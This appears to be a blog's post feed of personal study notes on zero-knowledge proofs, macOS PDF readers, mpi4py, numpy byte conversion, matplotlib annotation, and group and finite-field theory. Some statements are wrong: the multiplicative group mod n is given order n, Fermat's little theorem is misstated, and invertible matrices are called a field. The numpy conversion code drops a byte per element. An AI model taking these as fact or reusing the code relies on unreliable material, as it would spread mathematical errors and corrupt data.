          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ZK Application</title>
      <link href="/blog/2023/03/18/crypto/zk/1.zk_application/"/>
      <url>/blog/2023/03/18/crypto/zk/1.zk_application/</url>
      
        <content type="html"><![CDATA[<h1 id="zk-application">zk Application</h1><p>The concept and application of zk is evolving fast. It was good touse zk to achieve linear regression before, but now we have to use zk todo neural networks and social graphs, etc.</p><p>Two properties: privacy preservation and scalability, besides zk canensure the trust of data and computation.</p><h2 id="privacy">privacy</h2><ol type="1"><li><p>Proof of membership，from membership proof of set to the merkletree proof recently more efficient proof than merkle proof is proposed：<a href="https://eprint.iacr.org/2022/621">Caulk: Lookup Arguments inSublinear Time</a></p></li><li><p>Holding centralized parties accountable</p><p>The centralized server proves the correctness of the aggregationoperation and generates a zero-knowledge proof.</p><p>For example: The <ahref="https://github.com/privacy-scaling-explorations/maci">maci:Minimal anti collision infrastructure</a> coercion-resistant votingsystem. Voters submit votes encrypted with the key of a centraloperator, The operator in All votes are decrypted on the chain, and thencounted to reveal the final result. In addition, it is necessary toprove that they are indeed counted normally through zk-SNARK. Thisadditional complexity is a necessary overhead to ensure strong privacyproperties,</p></li><li><p>Combining ZK-SNARKs with MPC</p><p>generate proof for inputs from multi-party, while protecting theprivacy of each party.</p><p>A more advanced use of ZK-SNARKs involves making proofs overcomputations where the inputs are split between two or more parties, andwe don't want each party to learn the other parties' inputs. You cansatisfy the privacy requirement with garbled circuits in the 2-partycase, and more complicated multi-party computation protocols in theN-party case. ZK-SNARKs can be combined with these protocols to doverifiable multi-party computation.</p><p>This could enable more advanced reputation systems where multipleparticipants can perform joint computations over their private inputs,it could enable privacy-preserving but authenticated data markets, andmany other applications. That said, note that the math for doing thisefficiently is still relatively in its infancy.</p></li><li><p>ZKPs can be used to preserve data privacy in areas such as healthcare, communications, finance and civic tech.</p><ol type="1"><li><p>An interesting use case in finance is a proposal from ING toprove that a number is within a specific range without revealing thatnumber.</p><p>The Dutch bank ING has built a variation of this concept called “ZeroKnowledge Range Proof“. The system is designed to prove that a number iswithin a given range, without revealing the value of number. ING'sblockchain team notes that this can be used for instance to verify ifyour salary is sufficient to get a loan, without actually revealing howmuch you make.</p></li><li><p>The AdEx Network allows for decentralized, ZKP advertisementauctions in which a user can bid for the price of placing an ad withoutrevealing what that price is to other users.</p></li><li><p>Z-Cash, a cryptocurrency that allows for privatetransactions.</p></li></ol></li><li><p>blockchain with zk</p><p>blockcahin provide the censorship resistance, transaction guaranteedexecution and other guarantees, but with two costs, scalability andprivacy. Luckily, the two property, zero-knowledge, succinct of ZK-SNARKcan make it up exactly.</p><p>There are social connections and interactions between the accounts ofthe blockcahin, which can explore using historical data.</p><p>Explore ways to make proofs about this kind of shared network. Forinstance, I can prove with a group of people that there are two stepsbetween me and a person in the social graph.</p></li><li><p>interoperability application</p><p>Just like applications can be divided into scalability applicationand privacy application, zk may bring another category:<strong>interoperability application</strong>. For example, thesignature of github commit, rsa signature and authentication, etc., zkcan generalize the unique signatures of these different platforms andbecome interactive, for example: rsa signature can only be verified bythe other party running rsa verfication, but zk can implemente that:Include the rsa private key to the github account, or claim to have theecdsa private key of the Ethereum account.</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ZK introduction</title>
      <link href="/blog/2023/03/16/crypto/zk/0.zk_intro/"/>
      <url>/blog/2023/03/16/crypto/zk/0.zk_intro/</url>
      
        <content type="html"><![CDATA[<h1 id="zk-introduction">ZK introduction</h1><h2 id="zk-theory-basis-and-developments">ZK theory basis anddevelopments</h2><h3 id="theory-basis">Theory basis</h3><p>Zero knowledge Proof is composed of Mathematical Logic（mainlycomplexity and a few proof theory）and Cryptography.</p><p>For proof theroy, if logic is the science of valid inference, thenproofs embody its heart. There are two properties for the proof system,Soundness and Completeness.</p><ul><li>Given a certain proof system, the soundness theorem says that onlyvalid sentences are provable in it.</li><li>The completeness theorem says that every valid sentence is provablein it.</li></ul><p>zero knowledge proof doesn't give you an a right proof. It's aboutminimizing the probability that someone is lying to you.</p><h2 id="principles">Principles</h2><p>Suppose that you have a public input <spanclass="math inline">\(x\)</span>, a private input <spanclass="math inline">\(w\)</span>, and a (public) function <spanclass="math inline">\(f(x,w)-&gt;\{True, False\}\)</span>, whichperforms some kind of verification on the inputs. With a ZK-SNARK, youcan prove that for some given <span class="math inline">\(f\)</span> and<span class="math inline">\(x\)</span>, you know the an <spanclass="math inline">\(w\)</span> such that <spanclass="math inline">\(f(x,w) = True\)</span>, without revealing what<span class="math inline">\(w\)</span> is. Additionally, the verifiercan verify the proof much fast than computate <spanclass="math inline">\(f(x,w)\)</span> themselves directly, even if theykonw <span class="math inline">\(w\)</span>.</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16827573823310.jpg"alt="zk principle" /><figcaption aria-hidden="true">zk principle</figcaption></figure><p>Three properties:</p><ol type="1"><li><strong>Completeness</strong>: it should convince the verifier thatthe prover knows what they say they know</li><li><strong>Soundness</strong>: if the information is false, it cannotconvince the verifier that the prover’s information is true</li><li><strong>Zero-knowledge</strong>: it should reveal nothing else tothe verifier</li></ol><p>If verifier accepts, then it learns no additional information fromthe interaction, because <span class="math inline">\(verifier^*\)</span>could have simulated the entire dialog or interaction on his own.</p><blockquote><p><span class="math inline">\(verifier^*\)</span>: any verifier thateven deviates from the prescribed instruction of the protocol.</p></blockquote><h2 id="zk-snarks">ZK-SNARKs</h2><p>Zero-Knowledge Succinct Non-interactive ARguments of Knowledge, atype of non-interactive ZKP</p><p>Zero-Knowledge, because they don’t reveal any knowledge to theverifier succinct, because the proof can be verified quickly noninteractive, because repeated interaction is not required between proverand verifier and arguments of knowledge, because they present soundproof.</p><h2 id="drawbacks">Drawbacks</h2><ol type="1"><li>It can't produce a 100% airtight proof. It can only infinitelyreduce the probability that someone is faking a proof.</li><li>The algorithm is rather intensive, requiring either a large numberof interactions between verifier and prover or, in case of SNARK's,requiring a lot of computations that could make it impossible to run onslow or mobile devices. But that limitation can be overcome. The Zcashteam for instance has been at hard at work to improve their algorithm soit can also run on lower powered devices such as a smartphone.</li></ol><h2 id="developments">Developments</h2><p>zkp is first proposed in a paper from 1985 called “The KnowledgeComplexity of Interactive Proof-Systens. It develops fromnon-interactive form to interactive form.</p><ul><li><p>interactive proof: The claimed statement is verifiedprobabilistically by by utilizing a computational hard problem(<strong>NP-hard problem</strong>), a challenge-response protocol(<strong>randomness</strong>), and interactivity.</p></li><li><p>non-interactive proof: The verifier is replaced with a simulator,and the randomness challenge and interactivity can be achieved by twoways to hidden randomness,random oracle model (ROM) and common referencestring model (CRS).</p><p>you run the protocol with a simulator (who is just a verifier, butthe random choices are done differently), and then you can give thetranscript of the protocol to anyone and convince them that the proof isreal. Therefore, the proof is actually the transcript of the protocolbetween prover and the simulator (verifier). The verification processinvolves verifying whether the transcript is correct or not.</p></li></ul><h2 id="reference">Reference</h2><ol type="1"><li><ahref="https://blog.cambridgecoaching.com/what-are-the-soundness-and-completeness-theorems-in-logic-all-about">CC| What are the soundness and completeness theorems in logic allabout?</a></li><li><ahref="https://vitalik.ca/general/2022/06/15/using_snarks.html">Some waysto use ZK-SNARKs for privacy</a></li><li><ahref="https://www3.cs.stonybrook.edu/~pfodor/courses/CSE371/slides07/7slides.pdf">Chapter7: Proof Systems: Soundness and Completeness</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>macOS 最佳 pdf 阅读器</title>
      <link href="/blog/2023/03/16/linux/macos/mac_pdf/"/>
      <url>/blog/2023/03/16/linux/macos/mac_pdf/</url>
      
        <content type="html"><![CDATA[<ol type="1"><li><p>macOS 自带的 preview 查看 pdf 和合并删除 pdf页挺合适，但是高亮和笔记时不时会丢失</p></li><li><p>最近在 MacOS 上使用福昕阅读器，高亮等一些 PDF编辑器应有的特性无法使用 macOS 触控板实现，因此换上了大名鼎鼎的 AdobeAcrobat。</p><ol type="1"><li><p>Adobe Acrobat 每次都弹窗什么 read the entiredocument，而且滚动页面显示也很有问题，查了查是 accessibility插件的问题，解决办法：</p></li><li><p>在 Applications 里面进入 adobe acrobat 的文件夹 content中，然后进入 Plugins 文件夹，将其 <code>Accessibility.acroplugin</code>更名为一个别的名字，让软件无法使用即可。</p></li></ol><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd Adobe\ Acrobat\ DC/Adobe\ Acrobat.app/Contents/Plugins/Accessibility.acroplugin</span><br></pre></td></tr></table></figure></p><ol start="2" type="1"><li>“如果 PDF 文件包含视图属性，Adobe Acrobat 会默认读取上次这个 PDF文件的视图设置。如果恰巧上次你是采用单页模式查看，就会出现鼠标滚轮翻页慢的情况。可以通过菜单更改为单页连续模式，鼠标滚轮就恢复正常了。</li></ol><p>操作方法：视图——页面显示——单页连续， 也可以对齐设置默认单页连续</p></li></ol><p>最近使用 pdf 标注功能，使用轻量级 pdf 阅读器 skim，然后批注只有在skim 上看得到，别的 pdf 阅读器打开看不到批注，还是 Adobe Acrobat， pdfexpert 等重量级的 pdf 阅读编辑器好用</p><h2 id="结论">结论</h2><p>macOS 还是要买内存大一点，买个 24g+ 的内存，满足：</p><ol type="1"><li>多开 pdf （pdf 占内存是真的大）；</li><li>用 parallel desktop 开 windows 用 visio 画图；</li><li>开着 vscode 写 LaTeX 的习惯；</li><li>vscode 本地或远程敲代码与调整实验结果图片；</li><li>至少安装 Adobe Acrobat 功能最全，pdf expert 也可。</li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> macos </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MPI4py 使用总结</title>
      <link href="/blog/2023/03/15/programming/python/mpi4py/"/>
      <url>/blog/2023/03/15/programming/python/mpi4py/</url>
      
        <content type="html"><![CDATA[<h1 id="mpi4py">MPI4py</h1><ol type="1"><li><p>分布式环境下，内存不可能共享，因此不可能在所有rank/进程之间设置一个共享变量</p></li><li><p>mpi4py 应用在联邦学习的代码 <ahref="https://github.com/beiyuouo/mpi-federated-learning-simulation.git">mpi-federated-learning-simulation</a></p></li><li><p>comm.recv() 中的 status参数可以获取接收到的消息的相关信息，比如消息来源 使用方法参考： <ahref="https://stackoverflow.com/questions/21088420/mpi4py-send-recv-with-tag">python- mpi4py Send/Recv with tag - Stack Overflow</a></p></li><li><p>阻塞通信与非阻塞通信:</p><ol type="1"><li><p>阻塞通信： Python objects with blocking communication:<code>comm.send</code> <code>comm.recv</code> Numpy objects withnon-blocking communication: <code>comm.Send</code><code>comm.Recv</code></p></li><li><p>非阻塞通信： Python objects with non-blocking communication:<code>comm.isend</code> <code>comm.irecv</code> Numpy objects withnon-blocking communication: <code>comm.Isend</code><code>comm.Irecv</code> 注意： irecv 可以没有缓冲区接收，通过data=req.wait() 来返回数据 但是 Irecv 必须有缓冲区</p><p>(method) def irecv( buf: Buffer | None = None, source: int =ANY_SOURCE, tag: int = ANY_TAG ) -&gt; Request</p><p>(method) def Irecv( buf: BufSpec, source: int = ANY_SOURCE, tag: int= ANY_TAG ) -&gt; Request</p></li></ol></li><li><p>注意统一发送和接收的数据的格式，一定要确认格式一致，一旦出现发送的dtype 和接收的 dtype不一致的情况，最终结果、准确率就会受到影响。</p></li><li><p>参考资料</p><p><a href="https://www.ceci-hpc.be/assets/training/mpi4py.pdf">MPI4pycrash course</a></p></li></ol><h2 id="参考资料">参考资料</h2><p><ahref="https://buildmedia.readthedocs.org/media/pdf/mpi4py/stable/mpi4py.pdf">MPIfor Python</a> <ahref="https://stackoverflow.com/questions/16672587/defining-global-variables-in-mpi">c++- Defining global variables in mpi - Stack Overflow</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>convertion between numpy matrix and list of integers</title>
      <link href="/blog/2023/03/15/programming/python/ai/nparr_ints/"/>
      <url>/blog/2023/03/15/programming/python/ai/nparr_ints/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix2Int</span>(<span class="params">data_matrix</span>): <span class="comment"># data_matrix is a numpy matrix2Int</span></span><br><span class="line">    data_bytes, bytes_per_elem, data_shape = data_matrix.tobytes(), data_matrix.itemsize,data_matrix.shape</span><br><span class="line">    int_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data_bytes), bytes_per_elem):</span><br><span class="line">        int_list.append(<span class="built_in">int</span>.from_bytes(data_bytes[i:i+bytes_per_elem-<span class="number">1</span>], byteorder=sys.byteorder))</span><br><span class="line">    <span class="keyword">return</span> int_list, data_shape, data_matrix.dtype</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int2Matrix</span>(<span class="params">int_list, data_shape, data_dtype</span>):</span><br><span class="line">    <span class="comment"># 4. int to bytes</span></span><br><span class="line">    bytes_per_elem = np.dtype(data_dtype).itemsize</span><br><span class="line">    recovered_bytes = [i.to_bytes(</span><br><span class="line">        bytes_per_elem, byteorder=sys.byteorder) <span class="keyword">for</span> i <span class="keyword">in</span> int_list]</span><br><span class="line">    <span class="comment"># print(f&quot;recovered_bytes:&#123;recovered_bytes&#125;&quot;)</span></span><br><span class="line">    <span class="comment"># 5. bytes to numpy array</span></span><br><span class="line">    y = np.frombuffer(<span class="string">b&#x27;&#x27;</span>.join(recovered_bytes), dtype=data_dtype)</span><br><span class="line">    <span class="keyword">return</span> y.reshape(data_shape)</span><br></pre></td></tr></table></figure><p><code>.tobytes()</code> 将 numpy矩阵转换为字节字符串，<code>.itemsize</code>获得矩阵中单个元素的字节大小，便于后续恢复元素类型，例如 float64，int64等。</p><p>大整数和字节字符串之间的转换操作并不常见。然而，在一些应用领域有时候也会出现，比如密码学或者网络。</p><h2 id="参考">参考</h2><p><ahref="https://python3-cookbook.readthedocs.io/zh_CN/latest/c03/p05_pack_unpack_large_int_from_bytes.html#id1">3.5字节到大整数的打包与解包 — python3-cookbook 3.0.0 文档</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Matplotlib Annotation</title>
      <link href="/blog/2023/03/15/programming/python/ai/plot_annotation/"/>
      <url>/blog/2023/03/15/programming/python/ai/plot_annotation/</url>
      
        <content type="html"><![CDATA[<p>Matplotlib 中有两种标注，一种是无指向性标注 text，另一种是指向性注释annotate。</p><p>无指向性标注 text:<code>plt.text(-0.5, 5, "two functions", family="Times New Roman", fontsize=18, fontweight="bold", color='red')</code># 在 x 为-0.5，y 为 5 的区域开始文本标注</p><p>指向性注释 annotate。 annotate()函数用于注释，xy参数代表箭头指向的点，xytext 代表文本标注开始的点：</p><h2 id="加-circle">加 circle</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import matplotlib.pyplot as plt</span><br><span class="line"># draw cicle,(point[0], point[1]) is the center of the circle</span><br><span class="line">plt.plot(x_points[0], y_points[0], &#x27;o&#x27;,ms=radius * 2, mec=&#x27;black&#x27;, mfc=&#x27;none&#x27;, mew=2)</span><br><span class="line"></span><br><span class="line"># draw arrow pointing the circle</span><br><span class="line">plt.annotate(&quot;Attack stop&quot;, xy=(x_points[0], y_points[0]), xytext=(</span><br><span class="line">    x_points[0]+2, y_points[0]-29), arrowprops=dict(arrowstyle=&#x27;simple,tail_width=0.2,head_width=0.6,head_length=0.8&#x27;, facecolor=&#x27;black&#x27;, shrinkB=radius * 1.2), fontsize=15)</span><br></pre></td></tr></table></figure><p><code>plt.annotate</code>:</p><ol type="1"><li><code>xy(float, float)</code>: The point (x, y) to annotate. Thecoordinate system is determined by xycoords.</li><li><code>xytext(float, float)</code>, default: xy: The position (x, y)to place the text at. The coordinate system is determined bytextcoords.</li></ol><h2 id="参考资料">参考资料</h2><p><ahref="https://www.tutorialspoint.com/how-do-i-put-a-circle-with-annotation-in-matplotlib">Howdo I put a circle with annotation in matplotlib</a> <ahref="https://matplotlib.org/stable/api/_as_gen/matplotlib.pyplot.annotate.html">matplotlib.pyplot.annotate— Matplotlib 3.7.2 documentation</a></p><p><ahref="https://turingplanet.org/2021/09/28/matplotlib-intro-4/">图例Legend，标注(Text，Annotate)【Matplotlib 入门教程 4】 –TuringPlanet</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>3.数论与群论结合：整数模 n 乘法群</title>
      <link href="/blog/2023/03/14/crypto/math/3.integer_modular_group/"/>
      <url>/blog/2023/03/14/crypto/math/3.integer_modular_group/</url>
      
        <content type="html"><![CDATA[<h1 id="数论与群论结合整数模-n-乘法群">3.数论与群论结合：整数模 n乘法群</h1><h2 id="有限域与数论结合">有限域与数论结合</h2><p>代数结构研究一个特定对象的非空集合及其之前的操作。有限域 (finitefield) 或者伽罗瓦域 (Galois Field).有限域是定义在一类特定的对象上，满足加法、减法、乘法和除法运算的代数结构。而数论研究整数以及整数值函数。</p><p>有限域是一种数学对象，它既属于数论，也属于抽象代数的研究范畴。最常见的有限域是Fp = (Zp,+,x) <strong>整数模素数 p 有限域</strong>。Number theory所研究的整数作为 algebraic structure 群中的 objects组成集合，元素之间进行模算术运算。其代数操作包括基于范畴论衍生的群与群之间的同态映射操作，基于数论衍生的单个群内部的数之间的函数以及操作。</p><p>数论中的模算术（modular arithmetic）和有限域的循环群（cyclicgroup）具备相似的结构与规则。模运算的性质可以覆盖群环域所涉及的封闭性，结合律（加法性，乘法性），单位圆，逆元（模逆元），交换律，因此数论的模运算和群论的群环域结合，形成了最常见最有用的整数模素数p 有限域 GF(p)。</p><p>有限域涉及抽象代数的知识主要有：</p><ol type="1"><li>域的基本概念和性质，如交换环、整环、域、素域、同构、同态、自同构等。</li><li>域的扩张，<span class="math inline">\(F_p\)</span> 扩张到 <spanclass="math inline">\(F_{p^n}\)</span>。</li><li>域的应用，如伽罗瓦理论、可解性、根式解、基本定理、不可约多项式、有限域、循环域等。</li></ol><p>有限域涉及数论的知识主要有域的算术，如欧几里得算法、辗转相除法、最大公因数、最小公倍数、互素、模运算、同余、欧拉函数、费马小定理、欧拉定理等。</p><h2 id="有限域介绍">有限域介绍</h2><p>如果域 F只包含有限个元素，则称其为有限域。有限域中元素的个数称为有限域的阶(order)。尽管存在有无限个元素的无限域，但只有有限域在密码编码学中得到了广泛的应用。<strong>每个有限域的阶必为素数的幂（注：素数的幂不是素数）</strong>，即有限域的阶可表示为pⁿ（p 是素数、n 是正整数），该有限域通常称为 Galois 域 (GaloisFields)，记为 GF(pⁿ)。</p><p>当 n = 1 时，存在有限域 GF(p)，也称为素数域 (prime field),也写做<spanclass="math inline">\(\mathbb{F}_p\)</span>。在密码学中，最常用的域是阶为p 的素数域 <span class="math inline">\(\mathbb{F}_p\)</span>）或阶为<span class="math inline">\(2^n\)</span> 的 GF(2^n) 域。</p><h2 id="整数模-n-乘法群">整数模 n 乘法群</h2><p>Multiplicative group of integers modulo n : the elements of thisgroup can be thought of as the congruence classes, also known asresidues modulo n, denoted by <spanclass="math inline">\((Z/nZ)^*\)</span>（<code>*</code>表示正数，0 属于N 集和 Z 集，但不属于 <span class="math inline">\(N^*\)</span> 集）</p><p>整数模 n 乘法群是由模 n 的互质同余类组成的，0没有逆元，所以不包含在整数模 n 乘法群中。整数模 n 乘法群的阶为 n。</p><ol type="1"><li><p>从群论角度理解 n 为质数时，每个元素有逆元，模 n整数才能构成群。</p><p>模算术的剩余类 (Z/nZ, +) is <span class="math inline">\(C_n\)</span>可以组成一个 cyclic groups。</p><p>对于 Z/nZ 来说，n 为质数时，根据欧拉函数，任意元素 <spanclass="math inline">\(a^{\varphi(n)} \equiv 1 \mod n\)</span>,因此该元素通过拆分 <span class="math inline">\(\varphi(n)\)</span>就存在逆元，根据封闭性，它的不同幂次也是集合元素，也就生成了群，也就是生成元，所以n 是素数时，n 与每个元素互质，则每个元素都是循环群的生成元。</p><blockquote><p>The class <span class="math inline">\([m]_n\)</span> generates Z/nZif and only if gcd(m, n) = 1</p></blockquote></li><li><p>从数论角度理解：p 是素数，模 p 乘法构成群：</p><p>如果 p 是合数，那么 $ ax p$ 的结果，即 <spanclass="math inline">\(ax-kp\)</span> 的结果必为二者公因子的 gcd(a，p),而二者公因子不是 1，所以其中任意不互质元素 a 不是乘法逆元。</p><p><code>s = a*b, t = a*c, sx mode t, abx-kac=a(bx-kc) 为了让其最小 bx-kc=1</code>,如果 p 是质数，那么 <span class="math inline">\(gcd(a, p)=1\)</span> ,ax+py=1 可以求出逆元。</p></li></ol><h2 id="模-n-有限域">模 n 有限域</h2><p>模 n 整数环 ⟨Zn,+,x⟩ 是交换环, 含幺环. 当 n 为素数时可以证明 Zn构成域; 当 n 为合数时不构成整环和域.</p><p>n 不为素数，则只有与 n互质的元素，才有逆元，不是所有的元素都有逆元，所以是（Zn,x)只是具备交换律的幺半群，而不是交换群。而当 n 为素数，则 n与每个元素互质，即每个元素存在逆元，（Zn,x) 便成了交换群，⟨Zn,+,x⟩便成了域，所以说：模 p 的有限域⟨Zp,+,x⟩，p肯定是素数，否则就不是域了。</p><h2 id="gfpn">GF(p^n)</h2><p>GF(p^n) 是 GF(p)扩域而得，它不再是指单纯的数，而是<strong>从数扩展到多项式</strong>。一般而言,所有有限域都形如 <span class="math inline">\(F_{p^n}\)</span>, 其中 p是素数, n 是正整数. 该有限域有 <span class="math inline">\(p^n\)</span>个元素, 可以从 Fp 通过扩域得到。例如, 考虑域</p><p><span class="math display">\[\mathbb{F}_3[\sqrt{-1}]=\left\{a+b\sqrt{-1} \mid a, b \in \mathbb{F}_3\right\} \]</span></p><p>可以验证它在自然的加法、乘法下构成域. 它有 9 个元素, 因此这样就通过<span class="math inline">\(F_3\)</span> 的扩域得到了有限域 <spanclass="math inline">\(F_9\)</span></p><h3 id="费马小定理欧拉定律">费马小定理/欧拉定律</h3><p>费马小定理推论到群：若群 G 为 n 阶循环群，a 为 G 的生成元，则a^n=e</p><p>群推论到费马小定理：模素数 p 单位群 <spanclass="math inline">\(Z^*_p\)</span> 中 a 与 素数 p 互素， 欧拉函数<span class="math inline">\(\varphi(p)=p-1\)</span>，则 <spanclass="math inline">\(a^{\varphi(p)}=a^{p-1} \equiv 1 \modp\)</span>，所以推出费马小定理 <span class="math inline">\(a^{p-1}\equiv a \mod p\)</span></p><h2 id="参考资料">参考资料</h2><ol type="1"><li>A visit to group theory and elementary number theory Zhen DING</li><li><a href="https://en.wikipedia.org/wiki/Number_theory">Number theory- Wikipedia</a></li><li><a href="https://en.wikipedia.org/wiki/Finite_field">Finite field -Wikipedia</a></li><li><ahref="https://www.cnblogs.com/RioTian/p/15081092.html">【算法学习笔记】模运算总结- RioTian - 博客园</a></li><li><a href="https://mathworld.wolfram.com/PrimeField.html">Prime Field-- from Wolfram MathWorld</a></li><li><ahref="https://baike.baidu.com/item/%E6%9C%89%E9%99%90%E5%9F%9F/4273049">有限域_百度百科</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>1. 群的性质与常见群</title>
      <link href="/blog/2023/03/10/crypto/math/1.groups/"/>
      <url>/blog/2023/03/10/crypto/math/1.groups/</url>
      
        <content type="html"><![CDATA[<h1 id="群的性质与常见群">1. 群的性质与常见群</h1><h2 id="群的阶">群的阶</h2><p>群 G 的阶（order）定义为群所含元素的个数，用符号表示为: |G| 或ord(G)。</p><p>如果 G的元素为无限个，则称为无限群，其阶为无限大。如果元素为有限个，则称为有限群。</p><p>群里面的元素也定义了阶，群里面任意元素 a 的阶定义为最小的正整数，使得 <span class="math inline">\(a^m = e\)</span>，其中 e为群的单位元。如果这样的正整数 m 不存在，则表示 a 的阶为无限大。元素 a的阶用符号表示为：|a| 或 ord(a)。</p><h2 id="求幂">求幂</h2><p>给定群（G，·）对任意一个元素 a 应用 n 次运算符 “·”，表示为 <spanclass="math inline">\(a^n = a··a·a···a\)</span></p><p><span class="math inline">\(a^n\)</span> 叫做 a 的 n次幂。注意定义在群 (G,·) 上的 <span class="math inline">\(a^n\)</span>不能单纯的理解为平时所见的乘方。它表示在一个元素上对抽象的二元运算的重复多次使用。</p><p>例如当 G 表示定义在加法上的群时，<span class="math inline">\(a^n =a+a+···+a\)</span>。</p><h2 id="从范畴论看-group-关系">从范畴论看 group 关系</h2><p>范畴论是研究特定对象集合以及他们之间关系的理论。A Category is thecontent of a specific ”set” of things and the possible connectionsbetween things.</p><blockquote><p>Category theory is a general theory of mathematical structures andtheir relations. A category is formed by two sorts of objects: theobjects of the category, and the morphisms, which relate two objectscalled the source and the target of the morphism.</p></blockquote><p>范畴论将 set 推广：The category Set contains all sets and allpossible functions between sets。</p><h3 id="group-homomorphism">Group Homomorphism</h3><p>当我们研究 group 的时候，研究 "category of group" 以及 "functionsbetween group" 是非常自然的事情，因此就有了：</p><p>Homomorphism（同态映射）: Suppose (G,◦) and (H,·) two groups. afunction ϕ:G →H is a Homomorphism iff ∀ x,y∈G, ϕ(x◦y)=ϕ(x)·ϕ(y)</p><p>因此，The category Grp contains all groups and all possiblehomomorphism between groups.</p><p>同态映射在群论中的地位相当于线性变换在线性代数的地位，<strong>它是保持基础运算（加法和数乘）的映射。</strong></p><p>若同态映射是一个双射，称为 Isomorphism 同构: A homomorphism ϕ: G→H isa Isomorphism ⇐⇒ it is bijective i.e. there is a one-to-onecorrespondence of elements between their underlying sets.</p><h2 id="循环群">循环群</h2><p>循环群是一种很重要的群，也是已被完全解决了的一类群。 其定义为若一个群G 的每一个元都是 G 的某一个固定元 a 的乘方，则称 G 为循环群，记作G=(a)，a 称为 G 的一个生成元。</p><p><strong>循环群有无阶循环群和有阶循环群两种类型</strong>，有限与否与循环与否无对应关系，是两种独立的不同特征。</p><p>若 G 为 g 生成的 n 阶有限循环群，那么集合 G 可以写作 <spanclass="math inline">\(\{e, g, g^2, g^3,···,g^{n-1}\}\)</span>, 其中<span class="math inline">\(e=g^0=g^n\)</span>, e 为群的单位元。</p><p>对群 G 里面的任意元素 a 不断求幂都可以生成一个群，用符号 <a>表示。<a> 既可能是有限群，也可能是无限群。</p><p>设(a)是一个循环群， (1)若 |a|=∞，则(a)与整数加群 Z 同构； (2)若|a|=n，则(a)与模 n 的剩余类加群 Zn 同构。因此，从同构角度来看，循环群本质上只有两个：有限循环群和无限循环群</p><p>设 G 为 g 生成的 n 阶有限循环群,G 的任一元素可以表示为 <spanclass="math inline">\(g^k\)</span>, 其阶由以下公式给出： <spanclass="math display">\[\operatorname{ord}\left(g^k\right)=\frac{n}{\operatorname{gcd}(k,n)}\]</span></p><p>欧拉函数：对正整数 n，欧拉函数 <spanclass="math inline">\(\phi(n)\)</span> 是小于或等于 n 的正整数中与 n互质的数的数目</p><p>n 阶有限循环群生成元的个数为 <spanclass="math inline">\(\phi(n)\)</span></p><p>任何无限阶循环群是同构于整数加群， 任何有限阶循环群同构于模 n剩余类加群。同构保持交换性，而 a,b均可交换，因此任何循环群都是交换群（阿贝尔群）</p><h2 id="常见群环域结构">常见群环域结构</h2><ol type="1"><li>整数加群 (Z,+) 整数集对于整数的加法构成整数加群 ，其单位元为0，逆元为一个数的相反数。</li><li>整数乘法是幺半群，不存在逆元，不构成群。</li><li>矩阵加法构成群，矩阵乘法一般不存在逆元以及不满足交换律矩阵乘法，是幺半群。</li><li>整数加法与乘法<code>(Z,+,*)</code>, 矩阵<code>(M_n,+,*)</code>构成环。</li><li>非零模素数 p 整数有限域 GF(p)</li><li>非零有理数乘法群 <spanclass="math inline">\((Q^*，·)\)</span>,对普通乘法构成阿贝尔群。整数集对于整数的乘法不构成群，因为并不是所有的整数在乘法意义下都有逆元。整数通过加乘法逆元扩展到非零有理数群，才构成群。</li><li>非零实数乘法群 <span class="math inline">\((R^*, ·)\)</span> 或<span class="math display">\[\mathbb{R}^{\times}=\mathbb{R}\backslash\{0\}\]</span></li><li>矩阵关于加法和乘法 <spanclass="math display">\[\left(\mathcal{M}_n(\mathbb{R}),+,\times\right)\]</span>构成了一个环，但是一般情况下，矩阵并不构成域。在矩阵的情况下，加法和乘法通常满足结合律和分配律，但不满足交换律和存在逆元素。可逆矩阵（或称为非奇异矩阵）关于加法和乘法构成域，这个域称为可逆矩阵域或者通常称为一般线性群</li></ol><h2 id="参考资料">参考资料</h2><ol 